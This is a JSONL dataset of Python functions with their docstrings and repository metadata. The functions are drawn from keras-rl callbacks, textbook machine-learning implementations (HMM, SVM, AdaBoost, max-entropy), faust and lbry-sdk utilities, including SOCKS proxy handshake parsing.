{"docstring": "\"\"\"Return platform identifier as ANSI string.\"\"\"\n", "func_signal": "def platform(self) -> str:\n", "code": "return '{py_imp} {py_version} ({system} {machine})'.format(\n    py_imp=platform.python_implementation(),\n    py_version=platform.python_version(),\n    system=platform.system(),\n    machine=platform.machine(),\n)", "path": "faust/faust/cli/worker.py", "commit_date": "2020-09-22 00:00:00", "repo_name": "robinhood/faust", "stars": 6668, "license": "other", "language": "python", "size": 8707}
{"docstring": "\"\"\" Called at end of each episode for each callback in callbackList\"\"\"\n", "func_signal": "def on_episode_end(self, episode, logs={}):\n", "code": "for callback in self.callbacks:\n    # Check if callback supports the more appropriate `on_episode_end` callback.\n    # If not, fall back to `on_epoch_end` to be compatible with built-in Keras callbacks.\n    if callable(getattr(callback, 'on_episode_end', None)):\n        callback.on_episode_end(episode, logs=logs)\n    else:\n        callback.on_epoch_end(episode, logs=logs)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Print training time at end of training \"\"\"\n", "func_signal": "def on_train_end(self, logs):\n", "code": "duration = timeit.default_timer() - self.train_start\nprint('done, took {:.3f} seconds'.format(duration))", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Called at beginning of each action for each callback in callbackList\"\"\"\n", "func_signal": "def on_action_begin(self, action, logs={}):\n", "code": "for callback in self.callbacks:\n    if callable(getattr(callback, 'on_action_begin', None)):\n        callback.on_action_begin(action, logs=logs)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Reset environment variables at beginning of each episode \"\"\"\n", "func_signal": "def on_episode_begin(self, episode, logs):\n", "code": "self.episode_start[episode] = timeit.default_timer()\nself.observations[episode] = []\nself.rewards[episode] = []\nself.actions[episode] = []\nself.metrics[episode] = []", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Initialize metrics at the beginning of each episode \"\"\"\n", "func_signal": "def on_episode_begin(self, episode, logs):\n", "code": "assert episode not in self.metrics\nassert episode not in self.starts\nself.metrics[episode] = []\nself.starts[episode] = timeit.default_timer()", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Called at end of each action for each callback in callbackList\"\"\"\n", "func_signal": "def on_action_end(self, action, logs={}):\n", "code": "for callback in self.callbacks:\n    if callable(getattr(callback, 'on_action_end', None)):\n        callback.on_action_end(action, logs=logs)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Called at end of each step for each callback in callbackList\"\"\"\n", "func_signal": "def on_step_end(self, step, logs={}):\n", "code": "for callback in self.callbacks:\n    # Check if callback supports the more appropriate `on_step_end` callback.\n    # If not, fall back to `on_batch_end` to be compatible with built-in Keras callbacks.\n    if callable(getattr(callback, 'on_step_end', None)):\n        callback.on_step_end(step, logs=logs)\n    else:\n        callback.on_batch_end(step, logs=logs)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\"Processes an entire step by applying the processor to the observation, reward, and info arguments.\n\n# Arguments\n    observation (object): An observation as obtained by the environment.\n    reward (float): A reward as obtained by the environment.\n    done (boolean): `True` if the environment is in a terminal state, `False` otherwise.\n    info (dict): The debug info dictionary as obtained by the environment.\n\n# Returns\n    The tupel (observation, reward, done, reward) with with all elements after being processed.\n\"\"\"\n", "func_signal": "def process_step(self, observation, reward, done, info):\n", "code": "observation = self.process_observation(observation)\nreward = self.process_reward(reward)\ninfo = self.process_info(info)\nreturn observation, reward, done, info", "path": "keras-rl/rl/core.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Compute and log training statistics of the episode when done \"\"\"\n", "func_signal": "def on_episode_end(self, episode, logs):\n", "code": "duration = timeit.default_timer() - self.episode_start[episode]\nepisode_steps = len(self.observations[episode])\n\nmetrics = np.array(self.metrics[episode])\nmetrics_dict = {}\nwith warnings.catch_warnings():\n    warnings.filterwarnings('error')\n    for idx, name in enumerate(self.metrics_names):\n        try:\n            metrics_dict[name] = np.nanmean(metrics[:, idx])\n        except Warning:\n            metrics_dict[name] = float('nan')\n\nwandb.log({\n    'step': self.step,\n    'episode': episode + 1,\n    'duration': duration,\n    'episode_steps': episode_steps,\n    'sps': float(episode_steps) / duration,\n    'episode_reward': np.sum(self.rewards[episode]),\n    'reward_mean': np.mean(self.rewards[episode]),\n    'reward_min': np.min(self.rewards[episode]),\n    'reward_max': np.max(self.rewards[episode]),\n    'action_mean': np.mean(self.actions[episode]),\n    'action_min': np.min(self.actions[episode]),\n    'action_max': np.max(self.actions[episode]),\n    'obs_mean': np.mean(self.observations[episode]),\n    'obs_min': np.min(self.observations[episode]),\n    'obs_max': np.max(self.observations[episode]),\n    **metrics_dict\n})\n\n# Free up resources.\ndel self.episode_start[episode]\ndel self.observations[episode]\ndel self.rewards[episode]\ndel self.actions[episode]\ndel self.metrics[episode]", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Print training duration at end of training \"\"\"\n", "func_signal": "def on_train_end(self, logs):\n", "code": "duration = timeit.default_timer() - self.train_start\nprint('done, took {:.3f} seconds'.format(duration))", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Set environment for each callback in callbackList \"\"\"\n", "func_signal": "def _set_env(self, env):\n", "code": "for callback in self.callbacks:\n    if callable(getattr(callback, '_set_env', None)):\n        callback._set_env(env)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "# TODO: replace this with a simpler environment where we can actually test if it finds a solution\n", "func_signal": "def test_cdqn():\n", "code": "env = gym.make('Pendulum-v0')\nnp.random.seed(123)\nenv.seed(123)\nrandom.seed(123)\nnb_actions = env.action_space.shape[0]\n\nV_model = Sequential()\nV_model.add(Flatten(input_shape=(1,) + env.observation_space.shape))\nV_model.add(Dense(16))\nV_model.add(Activation('relu'))\nV_model.add(Dense(1))\n\nmu_model = Sequential()\nmu_model.add(Flatten(input_shape=(1,) + env.observation_space.shape))\nmu_model.add(Dense(16))\nmu_model.add(Activation('relu'))\nmu_model.add(Dense(nb_actions))\n\naction_input = Input(shape=(nb_actions,), name='action_input')\nobservation_input = Input(shape=(1,) + env.observation_space.shape, name='observation_input')\nx = Concatenate()([action_input, Flatten()(observation_input)])\nx = Dense(16)(x)\nx = Activation('relu')(x)\nx = Dense(((nb_actions * nb_actions + nb_actions) // 2))(x)\nL_model = Model(inputs=[action_input, observation_input], outputs=x)\n\nmemory = SequentialMemory(limit=1000, window_length=1)\nrandom_process = OrnsteinUhlenbeckProcess(theta=.15, mu=0., sigma=.3, size=nb_actions)\nagent = NAFAgent(nb_actions=nb_actions, V_model=V_model, L_model=L_model, mu_model=mu_model,\n                 memory=memory, nb_steps_warmup=50, random_process=random_process,\n                 gamma=.99, target_model_update=1e-3)\nagent.compile(Adam(lr=1e-3))\n\nagent.fit(env, nb_steps=400, visualize=False, verbose=0, nb_max_episode_steps=100)\nh = agent.test(env, nb_episodes=2, visualize=False, nb_max_episode_steps=100)\n# TODO: evaluate history", "path": "keras-rl/tests/integration/test_continuous.py", "commit_date": "2017-11-30 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Print training values at beginning of training \"\"\"\n", "func_signal": "def on_train_begin(self, logs):\n", "code": "self.train_start = timeit.default_timer()\nself.metrics_names = self.model.metrics_names\nprint('Training for {} steps ...'.format(self.params['nb_steps']))", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Update statistics of episode after each step \"\"\"\n", "func_signal": "def on_step_end(self, step, logs):\n", "code": "episode = logs['episode']\nself.observations[episode].append(logs['observation'])\nself.rewards[episode].append(logs['reward'])\nself.actions[episode].append(logs['action'])\nself.metrics[episode].append(logs['metrics'])\nself.step += 1", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Called at beginning of each step for each callback in callbackList\"\"\"\n", "func_signal": "def on_step_begin(self, step, logs={}):\n", "code": "for callback in self.callbacks:\n    # Check if callback supports the more appropriate `on_step_begin` callback.\n    # If not, fall back to `on_batch_begin` to be compatible with built-in Keras callbacks.\n    if callable(getattr(callback, 'on_step_begin', None)):\n        callback.on_step_begin(step, logs=logs)\n    else:\n        callback.on_batch_begin(step, logs=logs)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Update progression bar at the end of each step \"\"\"\n", "func_signal": "def on_step_end(self, step, logs):\n", "code": "if self.info_names is None:\n    self.info_names = logs['info'].keys()\nvalues = [('reward', logs['reward'])]\nif KERAS_VERSION > '2.1.3':\n    self.progbar.update((self.step % self.interval) + 1, values=values)\nelse:\n    self.progbar.update((self.step % self.interval) +\n                        1, values=values, force=True)\nself.step += 1\nself.metrics.append(logs['metrics'])\nif len(self.info_names) > 0:\n    self.infos.append([logs['info'][k] for k in self.info_names])", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Print metrics if interval is over \"\"\"\n", "func_signal": "def on_step_begin(self, step, logs):\n", "code": "if self.step % self.interval == 0:\n    if len(self.episode_rewards) > 0:\n        metrics = np.array(self.metrics)\n        assert metrics.shape == (\n            self.interval, len(self.metrics_names))\n        formatted_metrics = ''\n        if not np.isnan(metrics).all():  # not all values are means\n            means = np.nanmean(self.metrics, axis=0)\n            assert means.shape == (len(self.metrics_names),)\n            for name, mean in zip(self.metrics_names, means):\n                formatted_metrics += ' - {}: {:.3f}'.format(name, mean)\n\n        formatted_infos = ''\n        if len(self.infos) > 0:\n            infos = np.array(self.infos)\n            if not np.isnan(infos).all():  # not all values are means\n                means = np.nanmean(self.infos, axis=0)\n                assert means.shape == (len(self.info_names),)\n                for name, mean in zip(self.info_names, means):\n                    formatted_infos += ' - {}: {:.3f}'.format(\n                        name, mean)\n        print('{} episodes - episode_reward: {:.3f} [{:.3f}, {:.3f}]{}{}'.format(len(self.episode_rewards), np.mean(\n            self.episode_rewards), np.min(self.episode_rewards), np.max(self.episode_rewards), formatted_metrics, formatted_infos))\n        print('')\n    self.reset()\n    print('Interval {} ({} steps performed)'.format(\n        self.step // self.interval + 1, self.step))", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Reset statistics \"\"\"\n", "func_signal": "def reset(self):\n", "code": "self.interval_start = timeit.default_timer()\nself.progbar = Progbar(target=self.interval)\nself.metrics = []\nself.infos = []\nself.info_names = None\nself.episode_rewards = []", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Print logs at end of each episode \"\"\"\n", "func_signal": "def on_episode_end(self, episode, logs):\n", "code": "template = 'Episode {0}: reward: {1:.3f}, steps: {2}'\nvariables = [\n    episode + 1,\n    logs['episode_reward'],\n    logs['nb_steps'],\n]\nprint(template.format(*variables))", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "\"\"\" Save weights at interval steps during training \"\"\"\n", "func_signal": "def on_step_end(self, step, logs={}):\n", "code": "self.total_steps += 1\nif self.total_steps % self.interval != 0:\n    # Nothing to do.\n    return\n\nfilepath = self.filepath.format(step=self.total_steps, **logs)\nif self.verbose > 0:\n    print('Step {}: saving model to {}'.format(\n        self.total_steps, filepath))\nself.model.save_weights(filepath, overwrite=True)", "path": "keras-rl/rl/callbacks.py", "commit_date": "2019-11-11 00:00:00", "repo_name": "keras-rl/keras-rl", "stars": 5477, "license": "mit", "language": "python", "size": 1414}
{"docstring": "'''\n\u8ba1\u7b97\u4e66\u4e2d82\u9875\u6700\u4e0b\u9762\u90a3\u4e2a\u671f\u671b\n'''\n", "func_signal": "def cal_EPxy(self):\n", "code": "self.EPxy = defaultdict(float)\nfor id in xrange(self.n):\n    (x, y) = self.id2xy[id]\n    self.EPxy[id] = float(self.Pxy[(x, y)]) / float(self.N)", "path": "lihang_book_algorithm/maxENT/maxENT.py", "commit_date": "2016-11-09 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n\u516c\u5f0f 10.24\n\"\"\"\n", "func_signal": "def cal_gamma(self, i, t):\n", "code": "numerator = self.alpha[t][i]*self.beta[t][i]\ndenominator = 0\n\nfor j in range(self.N):\n    denominator += self.alpha[t][j]*self.beta[t][j]\n\nreturn numerator/denominator", "path": "lihang_book_algorithm/hmm/hmm.py", "commit_date": "2017-07-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n    calculate ent grap\n\"\"\"\n\n", "func_signal": "def calc_ent_grap(x,y):\n", "code": "base_ent = calc_ent(y)\ncondition_ent = calc_condition_ent(x, y)\nent_grap = base_ent - condition_ent\n\nreturn ent_grap", "path": "lihang_book_algorithm/decision_tree/decision_tree.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u6309\u7167\u4e66\u4e0a7.4.2\u9009\u62e9\u4e24\u4e2a\u53d8\u91cf\n'''\n", "func_signal": "def _select_two_parameters(self):\n", "code": "index_list = [i for i in xrange(self.N)]\n\ni1_list_1 = filter(lambda i: self.alpha[i] > 0 and self.alpha[i] < self.C, index_list)\ni1_list_2 = list(set(index_list) - set(i1_list_1))\n\ni1_list = i1_list_1\ni1_list.extend(i1_list_2)\n\nfor i in i1_list:\n    if self._satisfy_KKT(i):\n        continue\n\n    E1 = self.E[i]\n    max_ = (0, 0)\n\n    for j in index_list:\n        if i == j:\n            continue\n\n        E2 = self.E[j]\n        if abs(E1 - E2) > max_[0]:\n            max_ = (abs(E1 - E2), j)\n\n    return i, max_[1]", "path": "lihang_book_algorithm/svm/svm.py", "commit_date": "2016-11-14 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u8ba1\u7b97\u535a\u5ba2\u4e2d\u7684\u516c\u5f0f2\n'''\n\n", "func_signal": "def cal_probability(self,x,j):\n", "code": "molecule = self.cal_e(x,j)\ndenominator = sum([self.cal_e(x,i) for i in range(self.k)])\n\nreturn molecule/denominator", "path": "lihang_book_algorithm/softmax/softmax.py", "commit_date": "2016-12-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u521d\u59cb\u5316\u4e00\u4e9b\u53c2\u6570\n'''\n", "func_signal": "def _init_parameters(self, features, labels):\n", "code": "self.X = features\nself.Y = labels\n\nself.b = 0.0\nself.n = len(features[0])\nself.N = len(features)\nself.alpha = [0.0] * self.N\nself.E = [self._E_(i) for i in xrange(self.N)]\n\nself.C = 1000\nself.Max_Interation = 5000", "path": "lihang_book_algorithm/svm/svm.py", "commit_date": "2016-11-14 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u8ba1\u7b97\u4e6683\u9875\u6700\u4e0a\u9762\u90a3\u4e2a\u671f\u671b\n'''\n", "func_signal": "def cal_EPx(self):\n", "code": "self.EPx = [0.0 for i in xrange(self.n)]\n\nfor i, X in enumerate(self.X_):\n    Pyxs = self.cal_probality(X)\n\n    for x in X:\n        for Pyx, y in Pyxs:\n            if self.fxy(x, y):\n                id = self.xy2id[(x, y)]\n\n                self.EPx[id] += Pyx * (1.0 / self.N)", "path": "lihang_book_algorithm/maxENT/maxENT.py", "commit_date": "2016-11-09 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u8ba1\u7b97\u535a\u5ba2\u4e2d\u7684\u516c\u5f0f1\n'''\n\n", "func_signal": "def cal_partial_derivative(self,x,y,j):\n", "code": "first = int(y==j)                           # \u8ba1\u7b97\u793a\u6027\u51fd\u6570\nsecond = self.cal_probability(x,j)          # \u8ba1\u7b97\u540e\u9762\u90a3\u4e2a\u6982\u7387\n\nreturn -x*(first-second) + self.weight_lambda*self.w[j]", "path": "lihang_book_algorithm/softmax/softmax.py", "commit_date": "2016-12-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u5c06\u539ffeature\u7684\uff08a0,a1,a2,a3,a4,...\uff09\n\u53d8\u6210 (0_a0,1_a1,2_a2,3_a3,4_a4,...)\u5f62\u5f0f\n'''\n", "func_signal": "def rebuild_features(features):\n", "code": "new_features = []\nfor feature in features:\n    new_feature = []\n    for i, f in enumerate(feature):\n        new_feature.append(str(i) + '_' + str(f))\n    new_features.append(new_feature)\nreturn new_features", "path": "lihang_book_algorithm/maxENT/maxENT.py", "commit_date": "2016-11-09 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n    calculate shanno ent of x\n\"\"\"\n\n", "func_signal": "def calc_ent(x):\n", "code": "x_value_list = set([x[i] for i in range(x.shape[0])])\nent = 0.0\nfor x_value in x_value_list:\n    p = float(x[x == x_value].shape[0]) / x.shape[0]\n    logp = np.log2(p)\n    ent -= p * logp\n\nreturn ent", "path": "lihang_book_algorithm/decision_tree/decision_tree.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u8ba1\u7b97\u535a\u5ba2\u4e2d\u7684\u516c\u5f0f3\n'''\n\n", "func_signal": "def cal_e(self,x,l):\n", "code": "theta_l = self.w[l]\nproduct = np.dot(theta_l,x)\n\nreturn math.exp(product)", "path": "lihang_book_algorithm/softmax/softmax.py", "commit_date": "2016-12-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n\u968f\u673a\u751f\u6210 A\uff0cB\uff0cPi\n\u5e76\u4fdd\u8bc1\u6bcf\u884c\u76f8\u52a0\u7b49\u4e8e 1\n\"\"\"\n", "func_signal": "def init(self):\n", "code": "import random\nfor i in range(self.N):\n    randomlist = [random.randint(0,100) for t in range(self.N)]\n    Sum = sum(randomlist)\n    for j in range(self.N):\n        self.A[i][j] = randomlist[j]/Sum\n\nfor i in range(self.N):\n    randomlist = [random.randint(0,100) for t in range(self.M)]\n    Sum = sum(randomlist)\n    for j in range(self.M):\n        self.B[i][j] = randomlist[j]/Sum", "path": "lihang_book_algorithm/hmm/hmm.py", "commit_date": "2017-07-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "# trainset features\n", "func_signal": "def get_hog_features():\n", "code": "features_filepath = 'features/train.vec.npy'\n\nimgs = loadImageSet()\nlabels = loadLabelSet()\n\nfeatures = get_features(imgs)\nnp.save(features_filepath,features)\n\n# testset features\nfeatures_filepath = 'features/test.vec.npy'\n\nimgs = loadImageSet(1)\nlabels = loadLabelSet(1)\n\nfeatures = get_features(imgs)\nnp.save(features_filepath,features)\n\nfeatures = np.load(features_filepath)", "path": "lihang_book_algorithm/extract_features.py", "commit_date": "2016-07-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u516c\u5f0f8.5\n'''\n\n", "func_signal": "def _Z_(self,index,classifier):\n", "code": "Z = 0\n\nfor i in xrange(self.N):\n    Z += self._w_(index,classifier,i)\n\nreturn Z", "path": "lihang_book_algorithm/AdaBoost/adaboost.py", "commit_date": "2016-11-17 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u5bfb\u627e(x>v y=1)\u60c5\u51b5\u4e0b\u7684\u6700\u4f18v\n'''\n\n", "func_signal": "def _train_more_than_(self):\n", "code": "index = -1\nerror_score = 1000000\n\nfor i in self.indexes:\n    score = 0\n    for j in xrange(self.N):\n        val = 1\n        if self.X[j]<i:\n            val = -1\n\n        if val*self.Y[j]<0:\n            score += self.w[j]\n\n    if score < error_score:\n        index = i\n        error_score = score\n\nreturn index,error_score", "path": "lihang_book_algorithm/AdaBoost/adaboost.py", "commit_date": "2016-11-17 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n\u516c\u5f0f 10.26\n\"\"\"\n\n", "func_signal": "def cal_ksi(self, i, j, t):\n", "code": "numerator = self.alpha[t][i]*self.A[i][j]*self.B[j][self.O[t+1]]*self.beta[t+1][j]\ndenominator = 0\n\nfor i in range(self.N):\n    for j in range(self.N):\n        denominator += self.alpha[t][i]*self.A[i][j]*self.B[j][self.O[t+1]]*self.beta[t+1][j]\n\nreturn numerator/denominator", "path": "lihang_book_algorithm/hmm/hmm.py", "commit_date": "2017-07-16 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u5bfb\u627e(x<v y=1)\u60c5\u51b5\u4e0b\u7684\u6700\u4f18v\n'''\n\n", "func_signal": "def _train_less_than_(self):\n", "code": "index = -1\nerror_score = 1000000\n\nfor i in self.indexes:\n    score = 0\n    for j in xrange(self.N):\n        val = -1\n        if self.X[j]<i:\n            val = 1\n\n        if val*self.Y[j]<0:\n            score += self.w[j]\n\n    if score < error_score:\n        index = i\n        error_score = score\n\nreturn index,error_score", "path": "lihang_book_algorithm/AdaBoost/adaboost.py", "commit_date": "2016-11-17 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u516c\u5f0f(7.104)\n'''\n", "func_signal": "def _g_(self, i):\n", "code": "result = self.b\n\nfor j in xrange(self.N):\n    result += self.alpha[j] * self.Y[j] * self._K_(self.X[i], self.X[j])\n\nreturn result", "path": "lihang_book_algorithm/svm/svm.py", "commit_date": "2016-11-14 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "\"\"\"\n    calculate ent H(y|x)\n\"\"\"\n\n# calc ent(y|x)\n", "func_signal": "def calc_condition_ent(x, y):\n", "code": "x_value_list = set([x[i] for i in range(x.shape[0])])\nent = 0.0\nfor x_value in x_value_list:\n    sub_y = y[x == x_value]\n    temp_ent = calc_ent(sub_y)\n    ent += (float(sub_y.shape[0]) / y.shape[0]) * temp_ent\n\nreturn ent", "path": "lihang_book_algorithm/decision_tree/decision_tree.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "'''\n\u8ba1\u7b97\u4e6685\u9875\u516c\u5f0f6.22\n'''\n", "func_signal": "def cal_probality(self, X):\n", "code": "Pyxs = [(self.cal_pyx(X, y)) for y in self.Y_]\nZ = sum([prob for prob, y in Pyxs])\nreturn [(prob / Z, y) for prob, y in Pyxs]", "path": "lihang_book_algorithm/maxENT/maxENT.py", "commit_date": "2016-11-09 00:00:00", "repo_name": "WenDesi/lihang_book_algorithm", "stars": 5632, "license": "None", "language": "python", "size": 24380}
{"docstring": "# this checks that factory function correctly sets up the script\n", "func_signal": "def pay_script_hash(self, script_hash):\n", "code": "src1 = OutputScript.pay_script_hash(unhexlify(script_hash))\nself.assertEqual(src1.template.name, 'pay_script_hash')\nself.assertEqual(hexlify(src1.values['script_hash']), script_hash)\n# now we test that it will round trip\nsrc2 = OutputScript(src1.source)\nself.assertEqual(src2.template.name, 'pay_script_hash')\nself.assertEqual(hexlify(src2.values['script_hash']), script_hash)\nreturn hexlify(src1.source)", "path": "lbry-sdk/tests/unit/wallet/test_script.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# this checks that factory function correctly sets up the script\n", "func_signal": "def redeem_pubkey_hash(self, sig, pubkey):\n", "code": "src1 = InputScript.redeem_pubkey_hash(unhexlify(sig), unhexlify(pubkey))\nself.assertEqual(src1.template.name, 'pubkey_hash')\nself.assertEqual(hexlify(src1.values['signature']), sig)\nself.assertEqual(hexlify(src1.values['pubkey']), pubkey)\n# now we test that it will round trip\nsrc2 = InputScript(src1.source)\nself.assertEqual(src2.template.name, 'pubkey_hash')\nself.assertEqual(hexlify(src2.values['signature']), sig)\nself.assertEqual(hexlify(src2.values['pubkey']), pubkey)\nreturn hexlify(src1.source)", "path": "lbry-sdk/tests/unit/wallet/test_script.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# Wait for 2-byte response\n", "func_signal": "def _first_response(self):\n", "code": "data = self._read(2)\nif data[0] != 5:\n    raise SOCKSProtocolError(f'invalid SOCKS5 proxy response: {data}')\nif data[1] not in self._auth_methods:\n    raise SOCKSFailure('SOCKS5 proxy rejected authentication methods')\n\n# Authenticate if user-password authentication\nif data[1] == 2:\n    self._state = self._auth_response\n    return self._auth_bytes\nreturn self._request_connection()", "path": "lbry-sdk/lbry/wallet/rpc/socks.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\"\nWhen the decorated function has concurrent calls made to it with the same arguments, only run it once\n\"\"\"\n", "func_signal": "def cache_concurrent(async_fn):\n", "code": "cache: typing.Dict = {}\n\n@functools.wraps(async_fn)\nasync def wrapper(*args, **kwargs):\n    key = tuple([args, tuple([tuple([k, kwargs[k]]) for k in kwargs])])\n    cache[key] = cache.get(key) or asyncio.create_task(async_fn(*args, **kwargs))\n    try:\n        return await cache[key]\n    finally:\n        cache.pop(key, None)\n\nreturn wrapper", "path": "lbry-sdk/lbry/utils.py", "commit_date": "2020-12-24 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "\"\"\" Return a raw extended public key. \"\"\"\n", "func_signal": "def extended_key(self):\n", "code": "return self._extended_key(\n    self.ledger.extended_public_key_prefix,\n    self.pubkey_bytes\n)", "path": "lbry-sdk/lbry/wallet/bip32.py", "commit_date": "2020-01-03 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
{"docstring": "# Wait for 8-byte response\n", "func_signal": "def _first_response(self):\n", "code": "data = self._read(8)\nif data[0] != 0:\n    raise SOCKSProtocolError(f'invalid {self.name()} proxy '\n                             f'response: {data}')\nreply_code = data[1]\nif reply_code != 90:\n    msg = self.REPLY_CODES.get(\n        reply_code, f'unknown {self.name()} reply code {reply_code}')\n    raise SOCKSFailure(f'{self.name()} proxy request failed: {msg}')\n\n# Other fields ignored\nreturn None", "path": "lbry-sdk/lbry/wallet/rpc/socks.py", "commit_date": "2020-01-01 00:00:00", "repo_name": "lbryio/lbry-sdk", "stars": 7193, "license": "mit", "language": "python", "size": 23759}
